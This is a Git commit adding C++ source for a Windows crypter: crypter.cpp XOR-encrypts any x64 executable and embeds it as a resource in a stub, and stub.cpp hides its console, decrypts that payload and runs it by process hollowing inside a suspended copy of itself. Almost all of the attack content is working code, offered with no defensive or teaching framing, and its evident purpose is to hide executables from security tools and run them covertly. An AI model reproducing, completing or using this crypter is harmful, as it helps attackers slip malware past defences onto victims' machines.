00f999e0e7ed21033827fcebc4c6fbfc458e9168
Ricky5panish <79810730+Ricky5panish@users.noreply.github.com>
2022-12-14 02:39:36 +0100

    Add files via upload

---
+++ crypter.cpp
@@ -0,0 +1,154 @@
+#include <iostream>
+#include <windows.h>
+#include <fstream>
+
+using namespace std;
+
+// raw data of our Stub compiled stub
+unsigned char rawData[2462687] = { 0x4D, 0x5A, 0x90, ...};
+
+
+int main(int argc, char* argv[]) {
+
+    HANDLE hCon = GetStdHandle( STD_OUTPUT_HANDLE );   // link to console to change colors
+
+    cout << "Checking input arguments... ";
+    if (argc < 2) {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Start this program with arguments." << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+    SetConsoleTextAttribute( hCon, 2 );
+    cout << "Success" << endl;
+    SetConsoleTextAttribute( hCon, 7 );
+
+    const char *resFile = argv[1];
+
+
+    // read input file
+    cout << "Reading input file... ";
+    FILE *fileptr;
+    char *fileBuff;
+    long filelen;
+
+    fileptr = fopen(resFile, "rb"); // Open the file in binary mode
+    fseek(fileptr, 0, SEEK_END);    // jump to the end of the file
+    filelen = ftell(fileptr);   // get the current byte offset in the file
+    rewind(fileptr);    // jump back to the beginning of the file
+
+    fileBuff = (char *)malloc(filelen * sizeof(char));  // alloc memory for the file
+    fread(fileBuff, filelen, 1, fileptr);   // read in the entire file
+    fclose(fileptr);
+
+    if (fileBuff == NULL) {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Could not read input file." << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+    SetConsoleTextAttribute( hCon, 2 );
+    cout << "Success" << endl;
+    SetConsoleTextAttribute( hCon, 7 );
+
+
+    // check if input file is a valid x64 PE
+    cout << "Validate input file as x64 PE... ";
+    IMAGE_DOS_HEADER* _dosHeader = 	(PIMAGE_DOS_HEADER)	fileBuff;
+    IMAGE_NT_HEADERS64* _ntHeader  = 	(PIMAGE_NT_HEADERS64)(DWORD64(fileBuff) + _dosHeader->e_lfanew);
+    bool is64  = _ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
+    if (!is64) {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error. Input file is not a valid x64 PE" << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+    SetConsoleTextAttribute( hCon, 2 );
+    cout << "Success" << endl;
+    SetConsoleTextAttribute( hCon, 7 );
+
+
+    // XOR encrypt the resource data
+    cout << "Encrypting data... ";
+    char key = '6741865291';    //same key as in the compiled Stub
+    char encrypted[filelen];
+    for (int i = 0; i < filelen; i++)
+        encrypted[i] = fileBuff[i] ^ key;
+    if (encrypted == NULL) {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Could not encrypt the data" << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+    SetConsoleTextAttribute( hCon, 2 );
+    cout << "Success" << endl;
+    SetConsoleTextAttribute( hCon, 7 );
+
+
+    // write Stub
+    cout << "Writing stub... ";
+    fstream bin ("Stub.exe",ios :: out | ios :: binary);
+    if (!bin.write(reinterpret_cast<const char *>(rawData), sizeof(rawData))) {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Could not encrypt the data" << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+    bin.close();
+    SetConsoleTextAttribute( hCon, 2 );
+    cout << "Success" << endl;
+    SetConsoleTextAttribute( hCon, 7 );
+
+
+    // add encrypted data as resource to the stub
+    cout << "Write encrypted resource to stub... ";
+    HANDLE hUpdateRes;
+    BOOL result;
+
+    hUpdateRes = BeginUpdateResource("Stub.exe", FALSE);
+    if (hUpdateRes == NULL)
+    {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Could not open file for writing" << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+
+    result = UpdateResource(hUpdateRes,                  // update resource handle
+                            "BIN",                       // resource ID
+                            MAKEINTRESOURCE(132),        // resource name
+                            NULL,
+                            encrypted,                   // ptr to encrypted resource
+                            filelen);                    // size of resource
+
+    if (result == FALSE)
+    {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Could not add resource" << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+
+    // write changes and then close
+    if (!EndUpdateResource(hUpdateRes, FALSE))
+    {
+        SetConsoleTextAttribute( hCon, 4 );
+        cout << "Error: Could not write changes to file" << endl;
+        SetConsoleTextAttribute( hCon, 7 );
+        system("pause");
+        return 0;
+    }
+    SetConsoleTextAttribute( hCon, 2 );
+    cout << "Success" << endl;
+    SetConsoleTextAttribute( hCon, 7 );
+    system("pause");
+
+    return 0;
+}
---
+++ stub.cpp
@@ -0,0 +1,115 @@
+#include <iostream>
+#include <minwindef.h>
+#include <windows.h>
+
+unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) {
+    HGLOBAL hResData;
+    HRSRC   hResInfo;
+    unsigned char* pvRes;
+    HMODULE hModule = GetModuleHandle(NULL);
+
+    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
+        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
+        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
+    {
+        *dwSize = SizeofResource(hModule, hResInfo);
+        return 	pvRes;
+    }
+    // quit if no resource found
+    *dwSize = 0;
+    return 0;
+}
+
+int main() {
+    // hide console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    // get embeded resource
+    unsigned long dwSize;
+    unsigned char* resourcePtr = GetResource(132, "BIN", &dwSize);
+
+
+    // decrypt the resource raw data
+    char key = '6741865291';
+    char decrypted[dwSize];
+    for (int i = 0; i < dwSize; i++)
+        decrypted[i] = resourcePtr[i] ^ key;
+
+
+    // run PE resource (process hollowing technique)
+    void* pe = decrypted;
+
+    IMAGE_DOS_HEADER* DOSHeader;
+    IMAGE_NT_HEADERS64* NtHeader;
+    IMAGE_SECTION_HEADER* SectionHeader;
+
+    PROCESS_INFORMATION PI;
+    STARTUPINFOA SI;
+    ZeroMemory(&PI, sizeof(PI));
+    ZeroMemory(&SI, sizeof(SI));
+
+
+    void* pImageBase;
+
+    char currentFilePath[1024];
+
+    DOSHeader = PIMAGE_DOS_HEADER(pe);
+    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);
+
+
+    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {
+
+        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
+        // create new process for injection
+        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+
+            CONTEXT* CTX;
+            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+            CTX->ContextFlags = CONTEXT_FULL;
+
+            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
+                pImageBase = VirtualAllocEx(
+                        PI.hProcess,
+                        LPVOID(NtHeader->OptionalHeader.ImageBase),
+                        NtHeader->OptionalHeader.SizeOfImage,
+                        MEM_COMMIT | MEM_RESERVE,
+                        PAGE_EXECUTE_READWRITE
+                );
+
+
+                WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+                // write pe sections
+                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
+                {
+                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
+
+                    WriteProcessMemory(
+                            PI.hProcess,
+                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
+                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
+                            SectionHeader->SizeOfRawData,
+                            NULL
+                    );
+
+                    WriteProcessMemory(
+                            PI.hProcess,
+                            LPVOID(CTX->Rdx + 0x10),
+                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
+                            8,
+                            NULL
+                    );
+
+                }
+
+                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+                ResumeThread(PI.hThread);
+
+                WaitForSingleObject(PI.hProcess, NULL);
+
+                return 0;
+            }
+        }
+    }
+}
+
